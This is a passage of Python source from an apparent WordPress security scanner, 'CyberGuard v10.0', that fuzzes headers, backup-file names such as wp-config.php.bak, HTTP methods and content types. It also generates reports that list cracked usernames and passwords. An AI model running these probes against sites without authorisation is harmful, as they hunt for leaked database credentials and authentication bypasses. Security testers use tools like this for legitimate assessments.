        
        base_headers = self.ua_manager.get_rotating_headers()
        
        async with aiohttp.ClientSession() as session:
            for header_name, header_values in test_headers.items():
                for header_value in header_values:
                    try:
                        test_headers_dict = base_headers.copy()
                        test_headers_dict[header_name] = header_value
                        
                        async with session.get(url, headers=test_headers_dict, ssl=False) as response:
                            status_code = response.status
                            content = await response.text()
                            response_headers = dict(response.headers)
                            
                            # Check for interesting responses
                            anomaly_detected = False
                            description = ""
                            
                            # Status code anomalies
                            if status_code in [500, 501, 502, 503]:
                                anomaly_detected = True
                                description = f"Server error with {header_name} header manipulation"
                            
                            # Content changes
                            if header_value in content and header_name in ['User-Agent', 'Accept']:
                                anomaly_detected = True
                                description = f"Header value reflected in response: {header_name}"
                            
                            # Security header bypass
                            security_headers = ['X-Frame-Options', 'Content-Security-Policy', 'X-XSS-Protection']
                            if header_name == 'X-Forwarded-For' and any(h not in response_headers for h in security_headers):
                                anomaly_detected = True
                                description = "Possible security header bypass with IP spoofing"
                            
                            # Admin interface access
                            if header_name in ['Cookie', 'Authorization'] and any(admin_indicator in content.lower() for admin_indicator in ['dashboard', 'admin panel', 'welcome', 'logout']):
                                anomaly_detected = True
                                description = f"Possible authentication bypass with {header_name} header"
                            
                            if anomaly_detected:
                                findings.append({
                                    'type': 'Header Fuzzing',
                                    'url': url,
                                    'header': header_name,
                                    'value': header_value,
                                    'status_code': status_code,
                                    'description': description,
                                    'timestamp': datetime.now().isoformat()
                                })
                                
                                logger.warning(f"Header anomaly: {description} - {header_name}: {header_value}")
                    
                    except Exception as e:
                        logger.error(f"Header fuzzing error for {header_name}={header_value}: {e}")
                    
                    await asyncio.sleep(0.1)
        
        return findings
    
    async def _fuzz_file_extensions(self, url: str) -> List[Dict[str, Any]]:
        """Fuzz file extensions for hidden files"""
        findings = []
        
        # Common WordPress files with different extensions
        base_files = ['index', 'wp-config', 'wp-login', 'wp-admin', 'readme', 'license']
        extensions = ['.php~', '.php.bak', '.php.old', '.php.orig', '.php.save', '.bak', '.old', '.orig', '.save', '.swp', '.tmp', '.txt']
        
        async with aiohttp.ClientSession() as session:
            for base_file in base_files:
                for ext in extensions:
                    try:
                        test_url = f"{url}/{base_file}{ext}"
                        headers = self.ua_manager.get_rotating_headers()
                        
                        async with session.get(test_url, headers=headers, ssl=False) as response:
                            if response.status == 200:
                                content = await response.text()
                                
                                # Check if it's actually a backup/config file
                                sensitive_indicators = [
                                    'DB_NAME', 'DB_USER', 'DB_PASSWORD', 'AUTH_KEY',
                                    '<?php', 'define(', '$wp_', 'mysql_connect',
                                    'wp_config', 'wordpress', 'administrator'
                                ]
                                
                                if any(indicator in content for indicator in sensitive_indicators):
                                    findings.append({
                                        'type': 'File Extension Fuzzing',
                                        'url': test_url,
                                        'file': base_file,
                                        'extension': ext,
                                        'status_code': response.status,
                                        'description': f'Sensitive backup file found: {base_file}{ext}',
                                        'timestamp': datetime.now().isoformat()
                                    })
                                    
                                    logger.critical(f"Sensitive backup file: {test_url}")
                    
                    except Exception as e:
                        logger.error(f"File extension fuzzing error for {base_file}{ext}: {e}")
                    
                    await asyncio.sleep(0.1)
        
        return findings
    
    async def _fuzz_http_methods(self, url: str) -> List[Dict[str, Any]]:
        """Fuzz HTTP methods"""
        findings = []
        
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE', 'CONNECT']
        test_endpoints = ['/', '/wp-admin/', '/wp-login.php', '/wp-json/wp/v2/users']
        
        async with aiohttp.ClientSession() as session:
            for endpoint in test_endpoints:
                test_url = urljoin(url, endpoint)
                
                for method in methods:
                    try:
                        headers = self.ua_manager.get_rotating_headers()
                        
                        async with session.request(method, test_url, headers=headers, ssl=False) as response:
                            status_code = response.status
                            content = await response.text()
                            
                            # Check for interesting method responses
                            anomaly_detected = False
                            description = ""
                            
                            # Dangerous methods allowed
                            if method in ['PUT', 'DELETE', 'PATCH'] and status_code not in [405, 501]:
                                anomaly_detected = True
                                description = f"Dangerous HTTP method {method} allowed on {endpoint}"
                            
                            # TRACE method (XST vulnerability)
                            if method == 'TRACE' and status_code == 200:
                                anomaly_detected = True
                                description = f"TRACE method enabled - potential XST vulnerability"
                            
                            # OPTIONS method revealing information
                            if method == 'OPTIONS' and 'Allow:' in str(response.headers):
                                allowed_methods = response.headers.get('Allow', '')
                                if any(dangerous in allowed_methods for dangerous in ['PUT', 'DELETE', 'PATCH']):
                                    anomaly_detected = True
                                    description = f"OPTIONS reveals dangerous methods: {allowed_methods}"
                            
                            # Different content for different methods
                            if method != 'GET' and status_code == 200 and len(content) > 100:
                                anomaly_detected = True
                                description = f"Method {method} returns different content than GET"
                            
                            if anomaly_detected:
                                findings.append({
                                    'type': 'HTTP Method Fuzzing',
                                    'url': test_url,
                                    'method': method,
                                    'status_code': status_code,
                                    'description': description,
                                    'timestamp': datetime.now().isoformat()
                                })
                                
                                logger.warning(f"HTTP method anomaly: {description}")
                    
                    except Exception as e:
                        logger.error(f"HTTP method fuzzing error for {method} {test_url}: {e}")
                    
                    await asyncio.sleep(0.1)
        
        return findings
    
    async def _fuzz_content_types(self, url: str) -> List[Dict[str, Any]]:
        """Fuzz Content-Type headers"""
        findings = []
        
        content_types = [
            'application/json',
            'application/xml',
            'text/xml',
            'application/x-www-form-urlencoded',
            'multipart/form-data',
            'text/plain',
            'text/html',
            'application/octet-stream',
            'image/jpeg',
            'image/png',
            'application/pdf'
        ]
        
        test_data = '{"test": "data"}'
        login_url = urljoin(url, '/wp-login.php')
        
        async with aiohttp.ClientSession() as session:
            for content_type in content_types:
                try:
                    headers = self.ua_manager.get_rotating_headers()
                    headers['Content-Type'] = content_type
                    
                    async with session.post(login_url, data=test_data, headers=headers, ssl=False) as response:
                        status_code = response.status
                        content = await response.text()
                        
                        # Check for interesting responses
                        anomaly_detected = False
                        description = ""
                        
                        # Different error messages
                        if status_code in [400, 415, 422]:
                            if 'json' in content.lower() or 'xml' in content.lower():
                                anomaly_detected = True
                                description = f"Server processes {content_type} - potential for injection"
                        
                        # Server accepts unusual content types
                        if status_code == 200 and content_type in ['image/jpeg', 'application/pdf']:
                            anomaly_detected = True
                            description = f"Server accepts unusual content type: {content_type}"
                        
                        # XML external entity processing
                        if content_type in ['application/xml', 'text/xml'] and status_code != 415:
                            anomaly_detected = True
                            description = f"Server may process XML - potential XXE vulnerability"
                        
                        if anomaly_detected:
                            findings.append({
                                'type': 'Content-Type Fuzzing',
                                'url': login_url,
                                'content_type': content_type,
                                'status_code': status_code,
                                'description': description,
                                'timestamp': datetime.now().isoformat()
                            })
                            
                            logger.info(f"Content-Type anomaly: {description}")
                
                except Exception as e:
                    logger.error(f"Content-Type fuzzing error for {content_type}: {e}")
                
                await asyncio.sleep(0.1)
        
        return findings

class AdvancedReportGenerator:
    def __init__(self):
        self.reports_dir = Path(CONFIG['reports_dir'])
        self.reports_dir.mkdir(exist_ok=True)
        
    def generate_comprehensive_report(self, scan_results: Dict[str, Any], 
                                    vulnerabilities: List[Vulnerability],
                                    fuzzing_results: List[Dict[str, Any]], 
                                    successful_logins: List[Dict[str, str]],
                                    filename_prefix: str = "cyberguard") -> Dict[str, str]:
        """Generate comprehensive reports in multiple formats"""
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        base_filename = f"{filename_prefix}_{timestamp}"
        
        report_files = {
            'txt': self.reports_dir / f"{base_filename}.txt",
            'html': self.reports_dir / f"{base_filename}.html",
            'json': self.reports_dir / f"{base_filename}.json",
            'csv': self.reports_dir / f"{base_filename}.csv",
            'pdf': self.reports_dir / f"{base_filename}.pdf"
        }
        
        # Generate text report
        self._generate_text_report(scan_results, vulnerabilities, fuzzing_results, 
                                 successful_logins, report_files['txt'])
        
        # Generate HTML report
        self._generate_html_report(scan_results, vulnerabilities, fuzzing_results,
                                 successful_logins, report_files['html'])
        
        # Generate JSON report
        self._generate_json_report(scan_results, vulnerabilities, fuzzing_results,
                                 successful_logins, report_files['json'])
        
        # Generate CSV report
        self._generate_csv_report(vulnerabilities, report_files['csv'])
        
        # Generate PDF report
        self._generate_pdf_report(scan_results, vulnerabilities, fuzzing_results,
                                successful_logins, report_files['pdf'])
        
        logger.success(f"Comprehensive reports generated in {self.reports_dir}")
        
        return {format_type: str(path) for format_type, path in report_files.items()}
    
    def _generate_text_report(self, scan_results: Dict[str, Any], 
                            vulnerabilities: List[Vulnerability],
                            fuzzing_results: List[Dict[str, Any]],
                            successful_logins: List[Dict[str, str]], 
                            output_file: Path):
        """Generate detailed text report"""
        
        with open(output_file, 'w', encoding='utf-8') as f:
            # Header
            f.write("="*80 + "\n")
            f.write("CyberGuard v10.0 Enhanced Pro - Security Assessment Report\n")
            f.write("="*80 + "\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Target: {scan_results.get('url', 'Unknown')}\n")
            f.write("="*80 + "\n\n")
            
            # Executive Summary
            f.write("EXECUTIVE SUMMARY\n")
            f.write("-"*40 + "\n")
            
            total_vulns = len(vulnerabilities)
            critical_vulns = len([v for v in vulnerabilities if v.severity == 'critical'])
            high_vulns = len([v for v in vulnerabilities if v.severity == 'high'])
            medium_vulns = len([v for v in vulnerabilities if v.severity == 'medium'])
            low_vulns = len([v for v in vulnerabilities if v.severity == 'low'])
            
            f.write(f"Total Vulnerabilities Found: {total_vulns}\n")
            f.write(f"  • Critical: {critical_vulns}\n")
            f.write(f"  • High: {high_vulns}\n")
            f.write(f"  • Medium: {medium_vulns}\n")
            f.write(f"  • Low: {low_vulns}\n")
            f.write(f"Successful Logins: {len(successful_logins)}\n")
            f.write(f"Fuzzing Anomalies: {len(fuzzing_results)}\n\n")
            
            # Risk Assessment
            risk_score = self._calculate_risk_score(vulnerabilities, successful_logins)
            risk_level = self._get_risk_level(risk_score)
            f.write(f"Overall Risk Score: {risk_score}/100 ({risk_level})\n\n")
            
            # Target Information
            f.write("TARGET INFORMATION\n")
            f.write("-"*40 + "\n")
            
            if 'wordpress_info' in scan_results:
                wp_info = scan_results['wordpress_info']
                f.write(f"WordPress Detected: {'Yes' if wp_info.get('is_wordpress') else 'No'}\n")
                if wp_info.get('version'):
                    f.write(f"WordPress Version: {wp_info['version']}\n")
                if wp_info.get('theme'):
                    f.write(f"Active Theme: {wp_info['theme']}\n")
                if wp_info.get('plugins'):
                    f.write(f"Detected Plugins: {', '.join(wp_info['plugins'][:10])}\n")
                f.write(f"WAF Detected: {'Yes' if wp_info.get('waf_detected') else 'No'}\n")
                if wp_info.get('waf_type'):
                    f.write(f"WAF Type: {wp_info['waf_type']}\n")
            
            if 'network_info' in scan_results:
                net_info = scan_results['network_info']
                if net_info.get('ip'):
                    f.write(f"IP Address: {net_info['ip']}\n")
                if net_info.get('open_ports'):
                    f.write(f"Open Ports: {', '.join(map(str, net_info['open_ports']))}\n")
            
            f.write("\n")
            
            # Vulnerabilities Section
            if vulnerabilities:
                f.write("VULNERABILITIES DETECTED\n")
                f.write("-"*40 + "\n")
                
                for severity in ['critical', 'high', 'medium', 'low']:
                    severity_vulns = [v for v in vulnerabilities if v.severity == severity]
                    if severity_vulns:
                        f.write(f"\n{severity.upper()} SEVERITY ({len(severity_vulns)})\n")
                        f.write("~" * (len(severity) + 12) + "\n")
                        
                        for i, vuln in enumerate(severity_vulns, 1):
                            f.write(f"{i}. {vuln.name}\n")
                            f.write(f"   Description: {vuln.description}\n")
                            if vuln.cve:
                                f.write(f"   CVE: {vuln.cve}\n")
                            if vuln.exploit_available:
                                f.write(f"   Exploit Available: Yes\n")
                            if vuln.references:
                                f.write(f"   References: {', '.join(vuln.references)}\n")
                            f.write("\n")
            
            # Successful Logins
            if successful_logins:
                f.write("SUCCESSFUL LOGIN ATTEMPTS\n")
                f.write("-"*40 + "\n")
                for i, login in enumerate(successful_logins, 1):
                    f.write(f"{i}. Username: {login['username']}\n")
                    f.write(f"   Password: {login['password']}\n")
                    f.write(f"   URL: {login['url']}\n\n")
            
            # Fuzzing Results
            if fuzzing_results:
                f.write("FUZZING ANOMALIES\n")
                f.write("-"*40 + "\n")
                
                fuzzing_by_type = defaultdict(list)
                for result in fuzzing_results:
                    fuzzing_by_type[result['type']].append(result)
                
                for fuzz_type, results in fuzzing_by_type.items():
                    f.write(f"\n{fuzz_type} ({len(results)})\n")
                    f.write("~" * (len(fuzz_type) + 5) + "\n")
                    
                    for i, result in enumerate(results, 1):
                        f.write(f"{i}. {result['description']}\n")
                        f.write(f"   URL: {result['url']}\n")
                        f.write(f"   Status: {result['status_code']}\n")
                        f.write(f"   Timestamp: {result['timestamp']}\n\n")
            
            # Recommendations
            f.write("SECURITY RECOMMENDATIONS\n")
            f.write("-"*40 + "\n")
            self._write_recommendations(f, vulnerabilities, successful_logins, scan_results)
            
            f.write("\nEnd of Report\n")
            f.write("="*80 + "\n")
    
    def _generate_html_report(self, scan_results: Dict[str, Any], 
                            vulnerabilities: List[Vulnerability],
                            fuzzing_results: List[Dict[str, Any]],
                            successful_logins: List[Dict[str, str]], 
                            output_file: Path):
        """Generate interactive HTML report"""
        
        html_content = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>CyberGuard v10.0 Security Report</title>
            <style>
                body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }}
                .container {{ max-width: 1200px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
                .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 8px 8px 0 0; }}
                .header h1 {{ margin: 0; font-size: 2.5em; }}
                .header p {{ margin: 10px 0 0 0; opacity: 0.9; }}
                .content {{ padding: 30px; }}
                .summary {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }}
                .summary-card {{ background: #f8f9fa; padding: 20px; border-radius: 8px; border-left: 4px solid #007bff; }}
                .summary-card h3 {{ margin: 0 0 10px 0; color: #495057; }}
                .summary-card .number {{ font-size: 2em; font-weight: bold; color: #007bff; }}
                .critical {{ border-left-color: #dc3545 !important; }}
                .critical .number {{ color: #dc3545; }}
                .high {{ border-left-color: #fd7e14 !important; }}
                .high .number {{ color: #fd7e14; }}
                .medium {{ border-left-color: #ffc107 !important; }}
                .medium .number {{ color: #ffc107; }}
                .low {{ border-left-color: #28a745 !important; }}
                .low .number {{ color: #28a745; }}
                .section {{ margin-bottom: 30px; }}
                .section h2 {{ color: #495057; border-bottom: 2px solid #dee2e6; padding-bottom: 10px; }}
                .vulnerability {{ background: #fff; border: 1px solid #dee2e6; border-radius: 8px; margin: 10px 0; padding: 20px; }}
                .vulnerability.critical {{ border-left: 4px solid #dc3545; }}
                .vulnerability.high {{ border-left: 4px solid #fd7e14; }}
                .vulnerability.medium {{ border-left: 4px solid #ffc107; }}
                .vulnerability.low {{ border-left: 4px solid #28a745; }}
                .vulnerability h4 {{ margin: 0 0 10px 0; color: #495057; }}
                .severity-badge {{ display: inline-block; padding: 4px 8px; border-radius: 4px; color: white; font-size: 0.8em; font-weight: bold; }}
                .severity-critical {{ background: #dc3545; }}
                .severity-high {{ background: #fd7e14; }}
                .severity-medium {{ background: #ffc107; }}
                .severity-low {{ background: #28a745; }}
                .login-success {{ background: #d4edda; border: 1px solid #c3e6cb; border-radius: 8px; padding: 15px; margin: 10px 0; }}
                .fuzzing-result {{ background: #fff3cd; border: 1px solid #ffeaa7; border-radius: 8px; padding: 15px; margin: 10px 0; }}
                .risk-meter {{ width: 100%; height: 30px; background: linear-gradient(to right, #28a745, #ffc107, #fd7e14, #dc3545); border-radius: 15px; position: relative; margin: 20px 0; }}
                .risk-pointer {{ position: absolute; top: -10px; width: 4px; height: 50px; background: #333; border-radius: 2px; }}
                table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
                th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #dee2e6; }}
                th {{ background: #f8f9fa; font-weight: 600; }}
                .collapsible {{ cursor: pointer; user-select: none; }}
                .collapsible:hover {{ background: #f8f9fa; }}
                .collapsible-content {{ display: none; }}
                .collapsible.active + .collapsible-content {{ display: block; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🛡️ CyberGuard v10.0 Security Report</h1>
                    <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | Target: {scan_results.get('url', 'Unknown')}</p>
                </div>
                
                <div class="content">
        """
        
        # Summary cards
        total_vulns = len(vulnerabilities)
        critical_vulns = len([v for v in vulnerabilities if v.severity == 'critical'])
        high_vulns = len([v for v in vulnerabilities if v.severity == 'high'])
        medium_vulns = len([v for v in vulnerabilities if v.severity == 'medium'])
        low_vulns = len([v for v in vulnerabilities if v.severity == 'low'])
        risk_score = self._calculate_risk_score(vulnerabilities, successful_logins)
        
        html_content += f"""
                    <div class="summary">
                        <div class="summary-card critical">
                            <h3>Critical</h3>
                            <div class="number">{critical_vulns}</div>
                        </div>
                        <div class="summary-card high">
                            <h3>High</h3>
                            <div class="number">{high_vulns}</div>
                        </div>
                        <div class="summary-card medium">
                            <h3>Medium</h3>
                            <div class="number">{medium_vulns}</div>
                        </div>
                        <div class="summary-card low">
                            <h3>Low</h3>
                            <div class="number">{low_vulns}</div>
                        </div>
                        <div class="summary-card">
                            <h3>Risk Score</h3>
                            <div class="number">{risk_score}/100</div>
                        </div>
                        <div class="summary-card">
                            <h3>Successful Logins</h3>
                            <div class="number">{len(successful_logins)}</div>
                        </div>
                    </div>
                    
                    <div class="section">
                        <h2>Risk Assessment</h2>
                        <div class="risk-meter">
                            <div class="risk-pointer" style="left: {risk_score}%;"></div>
                        </div>
                        <p>Overall Risk Level: <strong>{self._get_risk_level(risk_score)}</strong></p>
                    </div>
        """
        
        # Vulnerabilities section
        if vulnerabilities:
            html_content += '<div class="section"><h2>🚨 Vulnerabilities</h2>'
            
            for vuln in vulnerabilities:
                html_content += f"""
                    <div class="vulnerability {vuln.severity}">
                        <h4>{vuln.name} <span class="severity-badge severity-{vuln.severity}">{vuln.severity.upper()}</span></h4>
                        <p>{vuln.description}</p>
                        {f'<p><strong>CVE:</strong> {vuln.cve}</p>' if vuln.cve else ''}
                        {f'<p><strong>Exploit Available:</strong> Yes</p>' if vuln.exploit_available else ''}
                        {f'<p><strong>References:</strong> {", ".join(vuln.references)}</p>' if vuln.references else ''}
                    </div>
                """
            
            html_content += '</div>'
        
        # Successful logins section
        if successful_logins:
            html_content += '<div class="section"><h2>🔓 Successful Login Attempts</h2>'
            
            for login in successful_logins:
                html_content += f"""
                    <div class="login-success">
                        <strong>Username:</strong> {login['username']} | 
                        <strong>Password:</strong> {login['password']} | 
                        <strong>URL:</strong> {login['url']}
                    </div>
                """
            
            html_content += '</div>'
        
        # Fuzzing results section
        if fuzzing_results:
            html_content += '<div class="section"><h2>🔍 Fuzzing Anomalies</h2>'
            
            for result in fuzzing_results:
                html_content += f"""
                    <div class="fuzzing-result">
                        <strong>{result['type']}:</strong> {result['description']}<br>
                        <small>URL: {result['url']} | Status: {result['status_code']}</small>
                    </div>
                """
            
            html_content += '</div>'
        
        # Target information
        if 'wordpress_info' in scan_results:
            wp_info = scan_results['wordpress_info']
            html_content += f"""
                <div class="section">
                    <h2>🎯 Target Information</h2>
                    <table>
                        <tr><th>Property</th><th>Value</th></tr>
                        <tr><td>WordPress Detected</td><td>{'Yes' if wp_info.get('is_wordpress') else 'No'}</td></tr>
                        {f'<tr><td>Version</td><td>{wp_info["version"]}</td></tr>' if wp_info.get('version') else ''}
                        {f'<tr><td>Theme</td><td>{wp_info["theme"]}</td></tr>' if wp_info.get('theme') else ''}
                        {f'<tr><td>Plugins</td><td>{", ".join(wp_info["plugins"][:5])}</td></tr>' if wp_info.get('plugins') else ''}
                        <tr><td>WAF Detected</td><td>{'Yes' if wp_info.get('waf_detected') else 'No'}</td></tr>
                        {f'<tr><td>WAF Type</td><td>{wp_info["waf_type"]}</td></tr>' if wp_info.get('waf_type') else ''}
                    </table>
                </div>
            """
        
        html_content += """
                </div>
            </div>
            
            <script>
                // Add interactivity
                document.querySelectorAll('.collapsible').forEach(element => {
                    element.addEventListener('click', function() {
                        this.classList.toggle('active');
                    });
                });
            </script>
        </body>
        </html>
        """
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
    
    def _generate_json_report(self, scan_results: Dict[str, Any], 
                            vulnerabilities: List[Vulnerability],
                            fuzzing_results: List[Dict[str, Any]],
                            successful_logins: List[Dict[str, str]], 
                            output_file: Path):
        """Generate machine-readable JSON report"""
        
        # Convert vulnerabilities to dict format
        vuln_dicts = []
        for vuln in vulnerabilities:
            vuln_dicts.append({
                'name': vuln.name,
                'severity': vuln.severity,
                'description': vuln.description,
                'cve': vuln.cve,
                'exploit_available': vuln.exploit_available,
                'references': vuln.references
            })
        
        report_data = {
            'metadata': {
                'tool': 'CyberGuard v10.0 Enhanced Pro',
                'generated': datetime.now().isoformat(),
                'target': scan_results.get('url', 'Unknown'),
                'scan_duration': scan_results.get('scan_duration', 'Unknown')
            },
            'summary': {
                'total_vulnerabilities': len(vulnerabilities),
                'critical_vulnerabilities': len([v for v in vulnerabilities if v.severity == 'critical']),
                'high_vulnerabilities': len([v for v in vulnerabilities if v.severity == 'high']),
                'medium_vulnerabilities': len([v for v in vulnerabilities if v.severity == 'medium']),
                'low_vulnerabilities': len([v for v in vulnerabilities if v.severity == 'low']),
                'successful_logins': len(successful_logins),
                'fuzzing_anomalies': len(fuzzing_results),
                'risk_score': self._calculate_risk_score(vulnerabilities, successful_logins),
                'risk_level': self._get_risk_level(self._calculate_risk_score(vulnerabilities, successful_logins))
            },
            'target_info': scan_results,
            'vulnerabilities': vuln_dicts,
            'successful_logins': successful_logins,
            'fuzzing_results': fuzzing_results,
            'recommendations': self._get_recommendations(vulnerabilities, successful_logins, scan_results)
        }
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
    
    def _generate_csv_report(self, vulnerabilities: List[Vulnerability], output_file: Path):
        """Generate CSV report for vulnerability tracking"""
        
        with open(output_file, 'w', newline='', encoding='utf-8') as csvfile:
            fieldnames = ['Name', 'Severity', 'Description', 'CVE', 'Exploit Available', 'References']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            
            writer.writeheader()
            for vuln in vulnerabilities:
                writer.writerow({
                    'Name': vuln.name,
                    'Severity': vuln.severity,
                    'Description': vuln.description,
                    'CVE': vuln.cve or '',
                    'Exploit Available': 'Yes' if vuln.exploit_available else 'No',
                    'References': ', '.join(vuln.references) if vuln.references else ''
                })
    
    def _generate_pdf_report(self, scan_results: Dict[str, Any], 
                           vulnerabilities: List[Vulnerability],
                           fuzzing_results: List[Dict[str, Any]],
                           successful_logins: List[Dict[str, str]], 
                           output_file: Path):
        """Generate professional PDF report"""
        
        try:
            doc = SimpleDocTemplate(str(output_file), pagesize=A4)
            styles = getSampleStyleSheet()
            story = []
            
            # Title
            title = Paragraph("CyberGuard v10.0 Enhanced Pro - Security Assessment Report", styles['Title'])
            story.append(title)
            story.append(Spacer(1, 12))
            
            # Metadata
            metadata = f"""
            <b>Generated:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}<br/>
            <b>Target:</b> {scan_results.get('url', 'Unknown')}<br/>
            <b>Total Vulnerabilities:</b> {len(vulnerabilities)}<br/>
            <b>Risk Score:</b> {self._calculate_risk_score(vulnerabilities, successful_logins)}/100
            """
            story.append(Paragraph(metadata, styles['Normal']))
            story.append(Spacer(1, 20))
            
            # Summary table
            if vulnerabilities:
                summary_data = [
                    ['Severity', 'Count'],
                    ['Critical', len([v for v in vulnerabilities if v.severity == 'critical'])],
                    ['High', len([v for v in vulnerabilities if v.severity == 'high'])],
                    ['Medium', len([v for v in vulnerabilities if v.severity == 'medium'])],
                    ['Low', len([v for v in vulnerabilities if v.severity == 'low'])]
                ]
                
                summary_table = Table(summary_data)
                summary_table.setStyle(TableStyle([
                    ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                    ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                    ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                    ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                    ('FONTSIZE', (0, 0), (-1, 0), 14),
                    ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                    ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                    ('GRID', (0, 0), (-1, -1), 1, colors.black)
                ]))
                
                story.append(Paragraph("Vulnerability Summary", styles['Heading2']))
                story.append(summary_table)
                story.append(Spacer(1, 20))
            
            # Vulnerabilities detail
            if vulnerabilities:
                story.append(Paragraph("Detailed Vulnerabilities", styles['Heading2']))
                
                for vuln in vulnerabilities:
                    vuln_text = f"""
                    <b>Name:</b> {vuln.name}<br/>
                    <b>Severity:</b> {vuln.severity.upper()}<br/>
                    <b>Description:</b> {vuln.description}<br/>
                    {f'<b>CVE:</b> {vuln.cve}<br/>' if vuln.cve else ''}
                    {f'<b>Exploit Available:</b> Yes<br/>' if vuln.exploit_available else ''}
                    """
                    story.append(Paragraph(vuln_text, styles['Normal']))
                    story.append(Spacer(1, 10))
            
            # Build PDF
            doc.build(story)
            
        except Exception as e:
            logger.error(f"PDF generation failed: {e}")
            # Fallback to simple text-based PDF
            self._generate_simple_pdf(scan_results, vulnerabilities, successful_logins, output_file)
    
    def _generate_simple_pdf(self, scan_results: Dict[str, Any], 
                           vulnerabilities: List[Vulnerability],
                           successful_logins: List[Dict[str, str]], 
                           output_file: Path):
        """Generate simple PDF using canvas"""
        
        try:
            c = canvas.Canvas(str(output_file), pagesize=letter)
            width, height = letter
            
            # Title
            c.setFont("Helvetica-Bold", 20)
            c.drawString(50, height - 50, "CyberGuard v10.0 Security Report")
            
            # Metadata
            c.setFont("Helvetica", 12)
            y = height - 100
            c.drawString(50, y, f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            c.drawString(50, y - 20, f"Target: {scan_results.get('url', 'Unknown')}")
            c.drawString(50, y - 40, f"Total Vulnerabilities: {len(vulnerabilities)}")
            
            # Vulnerabilities
            if vulnerabilities:
                y -= 80
                c.setFont("Helvetica-Bold", 14)
                c.drawString(50, y, "Vulnerabilities:")
                
                c.setFont("Helvetica", 10)
                for i, vuln in enumerate(vulnerabilities[:20]):  # Limit to prevent overflow
                    y -= 20
                    if y < 50:  # Start new page
                        c.showPage()
                        y = height - 50
                    
                    c.drawString(70, y, f"{i+1}. {vuln.name} ({vuln.severity.upper()})")
                    y -= 15
                    if y < 50:
                        c.showPage()
                        y = height - 50
                    c.drawString(90, y, vuln.description[:80] + "..." if len(vuln.description) > 80 else vuln.description)
            
            c.save()
            
        except Exception as e:
            logger.error(f"Simple PDF generation failed: {e}")
    
    def _calculate_risk_score(self, vulnerabilities: List[Vulnerability], 
                            successful_logins: List[Dict[str, str]]) -> int:
        """Calculate overall risk score"""
        score = 0
        
        # Base score from vulnerabilities
        for vuln in vulnerabilities:
            if vuln.severity == 'critical':
                score += 25
            elif vuln.severity == 'high':
                score += 15
            elif vuln.severity == 'medium':
                score += 8
            elif vuln.severity == 'low':
                score += 3
        
        # Additional score for successful logins
        score += len(successful_logins) * 20
        
        # Cap at 100
        return min(score, 100)
    
    def _get_risk_level(self, score: int) -> str:
        """Get risk level based on score"""
        if score >= 80:
            return "CRITICAL"
        elif score >= 60:
            return "HIGH"
        elif score >= 30:
            return "MEDIUM"
        elif score > 0:
            return "LOW"
        else:
            return "MINIMAL"
    
    def _write_recommendations(self, f, vulnerabilities: List[Vulnerability], 
                             successful_logins: List[Dict[str, str]], 
                             scan_results: Dict[str, Any]):
        """Write security recommendations"""
        recommendations = self._get_recommendations(vulnerabilities, successful_logins, scan_results)
        
        for i, rec in enumerate(recommendations, 1):
            f.write(f"{i}. {rec}\n")
    
    def _get_recommendations(self, vulnerabilities: List[Vulnerability], 
                           successful_logins: List[Dict[str, str]], 
                           scan_results: Dict[str, Any]) -> List[str]:
        """Get security recommendations"""
        recommendations = []
        
        # General recommendations
        recommendations.append("Keep WordPress core, themes, and plugins updated to the latest versions")
        recommendations.append("Implement Web Application Firewall (WAF) protection")
        recommendations.append("Use strong, unique passwords for all user accounts")
        recommendations.append("Enable two-factor authentication (2FA) for all admin accounts")
        recommendations.append("Regularly backup your website and database")
        recommendations.append("Limit login attempts and implement account lockouts")
        recommendations.append("Change default WordPress table prefixes")
        recommendations.append("Disable file editing in WordPress admin panel")
        recommendations.append("Remove unused themes and plugins")
        recommendations.append("Implement proper SSL/TLS configuration")
        
        # Specific recommendations based on findings
        if successful_logins:
            recommendations.append("URGENT: Change all compromised passwords immediately")
            recommendations.append("Review user accounts and remove unnecessary admin privileges")
            recommendations.append("Check for unauthorized changes in the admin panel")
        
        if any(v.severity == 'critical' for v in vulnerabilities):
            recommendations.append("URGENT: Address all critical vulnerabilities immediately")
            recommendations.append("Consider taking the site offline until critical issues are resolved")
        
        # WordPress-specific recommendations
        if scan_results.get('wordpress_info', {}).get('is_wordpress'):
            wp_info = scan_results['wordpress_info']
            
            if not wp_info.get('waf_detected'):
                recommendations.append("Consider implementing a Web Application Firewall (WAF)")
            
            if wp_info.get('xmlrpc_enabled'):
                recommendations.append("Disable XML-RPC if not needed (wp-config.php: add_filter('xmlrpc_enabled', '__return_false');)")
            
            if wp_info.get('wp_json_enabled'):
                recommendations.append("Consider restricting WordPress REST API access if not needed")
            
            if wp_info.get('directory_listing'):
                recommendations.append("Disable directory listing in web server configuration")
        
